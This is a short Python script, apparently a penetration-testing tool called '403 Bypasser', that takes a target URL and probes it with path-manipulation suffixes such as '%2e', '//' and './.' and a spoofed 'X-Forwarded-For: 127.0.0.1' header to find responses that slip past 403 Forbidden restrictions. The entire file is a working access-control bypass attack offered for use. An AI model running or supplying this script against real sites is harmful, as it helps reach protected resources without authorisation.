# -*- coding: utf-8 -*-
# 09.02.2021

try:
    import requests,argparse
except:
    print("There are libraries that have not been downloaded.")
    
def banner():
    print("""
 | || |  / _ \___ \  |  _ \                                     
 | || |_| | | |__) | | |_) |_   _ _ __   __ _ ___ ___  ___ _ __ 
 |__   _| | | |__ <  |  _ <| | | | '_ \ / _` / __/ __|/ _ \ '__|
    | | | |_| |__) | | |_) | |_| | |_) | (_| \__ \__ \  __/ |     - Aydin Baran Ertemir
    |_|  \___/____/  |____/ \__, | .__/ \__,_|___/___/\___|_|     - 403 Bypasser
                             __/ | |                              
                            |___/|_|
          """)
banner()    
bypass = ["%2e",".","?","??","//","./","/","*/","*","./.","././"]
headers2 = {"X-Forwarded-For":"127.0.0.1"}

parser = argparse.ArgumentParser(description="A.Baran Ertemir | 403 Forbidden Bypass Script")
parser.add_argument("-u","--url",required=True,type=str,help="Please give me the URL to bypass.")
args = parser.parse_args()

for i in bypass:
    r = requests.get(args.url+"/"+i,headers=headers2)
    if r.status_code == 200:
        print(r.status_code,"OK, IT'S ACCESIBLE [+]","|",args.url+"/"+i)
    elif r.status_code == 403:
        print(r.status_code,"OH, FORBIDDEN [-]","|",args.url+"/"+i)
    elif r.status_code == 302:
        print(r.status_code,"WOW, REDIRECTION [?]","|",args.url+"/"+i)
    else:
        print("Not 200,302 or 403","Status Code:",r.status_code,"")
